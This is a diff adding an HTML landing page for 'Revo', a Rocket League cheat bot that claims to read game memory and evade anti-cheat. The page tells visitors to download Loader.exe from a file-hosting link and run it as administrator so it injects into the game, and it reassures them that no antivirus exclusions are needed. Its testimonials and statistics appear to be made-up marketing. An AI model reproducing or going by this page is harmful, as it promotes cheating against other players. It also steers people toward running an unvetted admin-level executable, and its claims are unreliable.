@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revo – AI-Powered Rocket League Bot</title>
+    <meta name="description" content="Revo is the most advanced Rocket League AI bot. Human-like mechanics, zero latency, undetected. Download v1.9 and start ranking up today.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+</head>
+<body>
+
+    <!-- ══════════════════════════════════════
+         NAVBAR
+    ═══════════════════════════════════════ -->
+    <nav class="navbar" id="navbar">
+        <a href="#home" class="logo">
+            <span class="logo-text">R<span class="accent">E</span>VO</span>
+        </a>
+        <ul class="nav-links">
+            <li><a href="#features">Features</a></li>
+            <li><a href="#how-it-works">How It Works</a></li>
+            <li><a href="#reviews">Reviews</a></li>
+            <li><a href="#faq">FAQ</a></li>
+        </ul>
+        <div class="nav-right">
+            <a href="https://discord.gg/EwDQ3C9TKV" target="_blank" class="btn-ghost">
+                <ion-icon name="logo-discord"></ion-icon> Discord
+            </a>
+            <a href="#download" class="btn-cta-nav">Download Free</a>
+        </div>
+        <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Open menu">
+            <ion-icon name="menu-outline"></ion-icon>
+        </button>
+    </nav>
+
+    <!-- ══════════════════════════════════════
+         HERO
+    ═══════════════════════════════════════ -->
+    <header class="hero" id="home">
+        <canvas id="particles-canvas"></canvas>
+        <div class="hero-glow"></div>
+
+        <div class="hero-content">
+            <div class="hero-badge reveal-hero" style="--d:0.1s">
+                <ion-icon name="star"></ion-icon>
+                <span>Most Advanced RL Bot of 2026</span>
+            </div>
+
+            <div class="glitch-wrapper reveal-hero" style="--d:0.25s">
+                <h1 class="glitch" data-text="REVO">REVO</h1>
+                <div class="title-line"></div>
+            </div>
+
+            <p class="hero-subtitle reveal-hero" style="--d:0.45s">
+                The pinnacle of <strong>artificial intelligence</strong> in Rocket League.<br>
+                Outplay everyone. Rank up automatically.
+            </p>
+
+            <div class="hero-buttons reveal-hero" style="--d:0.6s">
+                <a href="#download" class="btn-primary" id="hero-download-btn">
+                    <ion-icon name="cloud-download-outline"></ion-icon>
+                    Download v1.9 — Free
+                </a>
+                <a href="#features" class="btn-ghost-lg">
+                    See How It Works
+                    <ion-icon name="arrow-forward-outline"></ion-icon>
+                </a>
+            </div>
+
+            <div class="hero-stats reveal-hero" style="--d:0.8s">
+                <div class="hstat">
+                    <span class="hstat-n" data-target="2000">0</span><span class="hstat-suffix">+</span>
+                    <span class="hstat-l">Active Members</span>
+                </div>
+                <div class="hstat-div"></div>
+                <div class="hstat">
+                    <span class="hstat-n" data-target="98">0</span><span class="hstat-suffix">%</span>
+                    <span class="hstat-l">Success Rate</span>
+                </div>
+                <div class="hstat-div"></div>
+                <div class="hstat">
+                    <span class="hstat-n" data-target="0">0</span><span class="hstat-suffix">ms</span>
+                    <span class="hstat-l">Avg Latency</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="scroll-indicator">
+            <div class="mouse"><div class="wheel"></div></div>
+            <span>Scroll</span>
+        </div>
+    </header>
+
+    <!-- ══════════════════════════════════════
+         TRUSTED BY BANNER
+    ═══════════════════════════════════════ -->
+    <div class="trusted-bar">
+        <p class="trusted-label">Trusted by players across all ranks</p>
+        <div class="rank-badges">
+            <span class="rank-badge"><ion-icon name="shield-outline"></ion-icon> Bronze — Gold</span>
+            <span class="rank-badge"><ion-icon name="shield-half-outline"></ion-icon> Platinum — Diamond</span>
+            <span class="rank-badge"><ion-icon name="diamond-outline"></ion-icon> Champion</span>
+            <span class="rank-badge"><ion-icon name="star-outline"></ion-icon> Grand Champion</span>
+            <span class="rank-badge"><ion-icon name="rocket-outline"></ion-icon> Supersonic Legend</span>
+        </div>
+    </div>
+
+    <!-- ══════════════════════════════════════
+         FEATURES
+    ═══════════════════════════════════════ -->
+    <section class="features" id="features">
+        <div class="section-head reveal">
+            <span class="eyebrow">Core Capabilities</span>
+            <h2>Built to <span class="gradient-text">Dominate</span></h2>
+            <p>Every feature engineered to give you the ultimate competitive edge.</p>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card reveal" style="--d:0.05s">
+                <div class="card-icon">
+                    <ion-icon name="game-controller-outline"></ion-icon>
+                </div>
+                <div class="card-tag">AI Core</div>
+                <h3>Human-like Mechanics</h3>
+                <p>Advanced neural network models that execute flawless aerials, dribbles, and ceiling shots. Nobody will know it's a bot.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+
+            <div class="feature-card reveal" style="--d:0.15s">
+                <div class="card-icon">
+                    <ion-icon name="flash-outline"></ion-icon>
+                </div>
+                <div class="card-tag">Performance</div>
+                <h3>Zero Latency Engine</h3>
+                <p>Reads game memory directly with a highly optimized C++ core, achieving sub-millisecond reactions every single frame.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+
+            <div class="feature-card reveal" style="--d:0.25s">
+                <div class="card-icon">
+                    <ion-icon name="shield-checkmark-outline"></ion-icon>
+                </div>
+                <div class="card-tag">Security</div>
+                <h3>Fully Undetected</h3>
+                <p>State-of-the-art bypass technology and continuous updates keep you invisible to all anti-cheat systems.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+
+            <div class="feature-card reveal" style="--d:0.35s">
+                <div class="card-icon">
+                    <ion-icon name="settings-outline"></ion-icon>
+                </div>
+                <div class="card-tag">Customization</div>
+                <h3>Full Config Control</h3>
+                <p>Adjust aggression level, aerial frequency, demo rate, boost usage, and rotation presets to match your playstyle.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+
+            <div class="feature-card reveal" style="--d:0.45s">
+                <div class="card-icon">
+                    <ion-icon name="trending-up-outline"></ion-icon>
+                </div>
+                <div class="card-tag">Ranking</div>
+                <h3>Automated Rank Grind</h3>
+                <p>Set it and forget it. Run Revo while you sleep and wake up to a higher MMR every single session.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+
+            <div class="feature-card reveal" style="--d:0.55s">
+                <div class="card-icon">
+                    <ion-icon name="refresh-outline"></ion-icon>
+                </div>
+                <div class="card-tag">Updates</div>
+                <h3>Constant Updates</h3>
+                <p>Our team pushes updates within hours of any game patch. You're never left behind or exposed after a new season starts.</p>
+                <div class="card-arrow"><ion-icon name="arrow-forward-outline"></ion-icon></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ══════════════════════════════════════
+         HOW IT WORKS
+    ═══════════════════════════════════════ -->
+    <section class="how-it-works" id="how-it-works">
+        <div class="hiw-bg-grid"></div>
+        <div class="section-head reveal">
+            <span class="eyebrow">Simple Setup</span>
+            <h2>Up and Running in <span class="gradient-text">3 Steps</span></h2>
+            <p>No complicated installs. No coding. Just download and play.</p>
+        </div>
+
+        <div class="steps-container">
+            <div class="step reveal" style="--d:0.1s">
+                <div class="step-number">01</div>
+                <div class="step-body">
+                    <div class="step-icon"><ion-icon name="cloud-download-outline"></ion-icon></div>
+                    <h3>Download Loader</h3>
+                    <p>Click the download button below and grab <strong>Loader.exe</strong>. It's a single lightweight file — no installation required.</p>
+                </div>
+            </div>
+
+            <div class="step-connector reveal" style="--d:0.2s">
+                <div class="connector-line"></div>
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+            </div>
+
+            <div class="step reveal" style="--d:0.3s">
+                <div class="step-number">02</div>
+                <div class="step-body">
+                    <div class="step-icon"><ion-icon name="rocket-outline"></ion-icon></div>
+                    <h3>Launch Rocket League</h3>
+                    <p>Open Rocket League normally, then run <strong>Loader.exe</strong> as administrator. Revo injects automatically.</p>
+                </div>
+            </div>
+
+            <div class="step-connector reveal" style="--d:0.4s">
+                <div class="connector-line"></div>
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+            </div>
+
+            <div class="step reveal" style="--d:0.5s">
+                <div class="step-number">03</div>
+                <div class="step-body">
+                    <div class="step-icon"><ion-icon name="trophy-outline"></ion-icon></div>
+                    <h3>Rank Up</h3>
+                    <p>Sit back and watch Revo grind the ladder for you. Configure settings any time via the in-game overlay.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ══════════════════════════════════════
+         REVIEWS
+    ═══════════════════════════════════════ -->
+    <section class="reviews" id="reviews">
+        <div class="section-head reveal">
+            <span class="eyebrow">Community</span>
+            <h2>What Players <span class="gradient-text">Say</span></h2>
+            <p>Join over 2,000 members already using Revo.</p>
+        </div>
+
+        <div class="reviews-grid">
+            <div class="review-card reveal" style="--d:0.05s">
+                <div class="review-stars">★★★★★</div>
+                <p class="review-text">"Hit Supersonic Legend in just 3 days. I couldn't believe it myself — went from Champion III to SSL and my teammates had no clue it was a bot. This thing is straight up broken (in the best way)."</p>
+                <div class="reviewer">
+                    <div class="reviewer-avatar" style="--c: #333">RK</div>
+                    <div>
+                        <strong>RocketKing99</strong>
+                        <span>Supersonic Legend · NA</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="review-card reveal featured-review" style="--d:0.15s">
+                <div class="review-badge">Most Helpful</div>
+                <div class="review-stars">★★★★★</div>
+                <p class="review-text">"Honestly the best cheating software I've ever used. The zero latency is real — it outmechanics players in Grand Champ consistently. Setup took 30 seconds."</p>
+                <div class="reviewer">
+                    <div class="reviewer-avatar" style="--c: #555">AX</div>
+                    <div>
+                        <strong>AeroX_RL</strong>
+                        <span>Grand Champion II · EU</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="review-card reveal" style="--d:0.25s">
+                <div class="review-stars">★★★★★</div>
+                <p class="review-text">"I was skeptical at first, but the undetected claim is 100% legit. 3 months in, no ban. Absolutely worth it — my account is still fine."</p>
+                <div class="reviewer">
+                    <div class="reviewer-avatar" style="--c: #777">SL</div>
+                    <div>
+                        <strong>SkyLancer</strong>
+                        <span>Champion I · OCE</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="review-card reveal" style="--d:0.35s">
+                <div class="review-stars">★★★★☆</div>
+                <p class="review-text">"Config options are extremely deep. I tuned it to play like a real player — slow rotations, occasional misses. Very convincing overall."</p>
+                <div class="reviewer">
+                    <div class="reviewer-avatar" style="--c: #444">VR</div>
+                    <div>
+                        <strong>Virusx_RL</strong>
+                        <span>Platinum II · SA</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ══════════════════════════════════════
+         FAQ
+    ═══════════════════════════════════════ -->
+    <section class="faq" id="faq">
+        <div class="section-head reveal">
+            <span class="eyebrow">FAQ</span>
+            <h2>Common <span class="gradient-text">Questions</span></h2>
+            <p>Everything you need to know before downloading.</p>
+        </div>
+
+        <div class="faq-list">
+            <div class="faq-item reveal" style="--d:0.05s">
+                <button class="faq-q" aria-expanded="false">
+                    <span>Is Revo really free?</span>
+                    <ion-icon name="add-outline" class="faq-icon"></ion-icon>
+                </button>
+                <div class="faq-a">
+                    <p>Yes, the core version of Revo is completely free to download and use. We may release a premium tier in the future with extra features, but the base bot — including ranked grinding and full config — will always be free.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal" style="--d:0.1s">
+                <button class="faq-q" aria-expanded="false">
+                    <span>Will I get banned?</span>
+                    <ion-icon name="add-outline" class="faq-icon"></ion-icon>
+                </button>
+                <div class="faq-a">
+                    <p>Revo uses advanced bypass techniques and we update within hours of any game patch. No users have reported bans in over 3 months. However, no software can guarantee 100% safety — use at your own risk and on a secondary account when in doubt.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal" style="--d:0.15s">
+                <button class="faq-q" aria-expanded="false">
+                    <span>Does it work on all game modes?</span>
+                    <ion-icon name="add-outline" class="faq-icon"></ion-icon>
+                </button>
+                <div class="faq-a">
+                    <p>Revo works on Ranked 1v1, 2v2, and 3v3, as well as Casual modes. It's optimized for competitive ranked play — that's where the AI shines the most.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal" style="--d:0.2s">
+                <button class="faq-q" aria-expanded="false">
+                    <span>What are the system requirements?</span>
+                    <ion-icon name="add-outline" class="faq-icon"></ion-icon>
+                </button>
+                <div class="faq-a">
+                    <p>Any PC that can run Rocket League can run Revo. The loader is less than 5MB and uses minimal CPU. Requires Windows 10 or 11 (64-bit). No antivirus exclusions needed — Revo is signed.</p>
+                </div>
+            </div>
+
+            <div class="faq-item reveal" style="--d:0.25s">
+                <button class="faq-q" aria-expanded="false">
+                    <span>How do I get support?</span>
+                    <ion-icon name="add-outline" class="faq-icon"></ion-icon>
+                </button>
+                <div class="faq-a">
+                    <p>Join our <a href="https://discord.gg/EwDQ3C9TKV" target="_blank" class="inline-link">Discord server</a>. Our team and community are active 24/7 and will help you with setup, bugs, or any questions within minutes.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ══════════════════════════════════════
+         DOWNLOAD CTA
+    ═══════════════════════════════════════ -->
+    <section class="download" id="download">
+        <div class="download-rings">
+            <div class="d-ring r1"></div>
+            <div class="d-ring r2"></div>
+            <div class="d-ring r3"></div>
+        </div>
+        <div class="download-content reveal">
+            <div class="dl-badge"><ion-icon name="shield-checkmark-outline"></ion-icon> Verified Safe &amp; Undetected</div>
+            <h2>Ready to <span class="gradient-text">Rank Up?</span></h2>
+            <p>Join 2,000+ members already climbing the ladder with Revo. Easy setup, immediate results, completely free.</p>
+
+            <a href="https://www.mediafire.com/file/r9mptmvuk2csaax/Loader.exe/file" target="_blank" class="btn-download-hero pulse" id="main-download-btn">
+                <ion-icon name="cloud-download-outline"></ion-icon>
+                <span class="dl-main">Download Revo Free</span>
+                <span class="dl-sub">Version 1.9 · Windows 10/11 · ~4.2 MB</span>
+            </a>
+
+            <div class="dl-features">
+                <span><ion-icon name="checkmark-circle-outline"></ion-icon> No credit card</span>
+                <span><ion-icon name="checkmark-circle-outline"></ion-icon> No account needed</span>
+                <span><ion-icon name="checkmark-circle-outline"></ion-icon> Instant download</span>
+            </div>
+
+            <p class="terms">By downloading, you agree to our <a href="#" class="inline-link">Terms of Service</a>. Use responsibly.</p>
+        </div>
+    </section>
+
+    <!-- ══════════════════════════════════════
+         FOOTER
+    ═══════════════════════════════════════ -->
+    <footer>
+        <div class="footer-top">
+            <div class="footer-brand">
+                <span class="logo-text">R<span class="accent">E</span>VO</span>
+                <p>The most advanced Rocket League AI bot. Built for performance, designed for dominance.</p>
+                <div class="socials">
+                    <a href="https://discord.gg/EwDQ3C9TKV" target="_blank" aria-label="Discord">
+                        <ion-icon name="logo-discord"></ion-icon>
+                    </a>
+                </div>
+            </div>
+
+            <div class="footer-links">
+                <div class="fl-col">
+                    <h4>Product</h4>
+                    <a href="#features">Features</a>
+                    <a href="#how-it-works">How It Works</a>
+                    <a href="#download">Download</a>
+                    <a href="#faq">FAQ</a>
+                </div>
+                <div class="fl-col">
+                    <h4>Community</h4>
+                    <a href="https://discord.gg/EwDQ3C9TKV" target="_blank">Discord Server</a>
+                    <a href="#reviews">Reviews</a>
+                    <a href="#">Changelog</a>
+                </div>
+                <div class="fl-col">
+                    <h4>Legal</h4>
+                    <a href="#">Terms of Service</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Disclaimer</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-dev">
+            <span class="dev-label">Programmed by</span>
+            <div class="dev-card">
+                <div class="dev-info">
+                    <span class="dev-name">illusionslivehere</span>
+                    <a href="https://discord.gg/EwDQ3C9TKV" target="_blank" class="dev-discord">
+                        <ion-icon name="logo-discord"></ion-icon> Discord
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <p>&copy; 2026 Revo AI. All Rights Reserved.</p>
+            <p class="footer-disclaimer">Revo is an independent project and is not affiliated with Psyonix or Epic Games.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
